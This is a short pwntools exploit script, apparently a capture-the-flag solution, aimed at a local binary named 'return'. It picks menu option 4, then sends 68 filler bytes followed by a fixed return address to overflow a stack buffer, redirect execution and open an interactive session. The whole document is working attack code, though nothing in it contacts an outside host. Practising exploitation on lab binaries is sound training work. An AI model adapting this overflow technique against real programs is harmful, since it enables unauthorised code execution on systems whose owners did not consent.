from pwn import *

r = process("./return")
offset = 68
target = p32(0x08048646)
payload = ""
payload += "A"*offset
payload += target
r.sendline("4")
r.sendline(payload)
r.recvuntil(">>")
r.interactive()
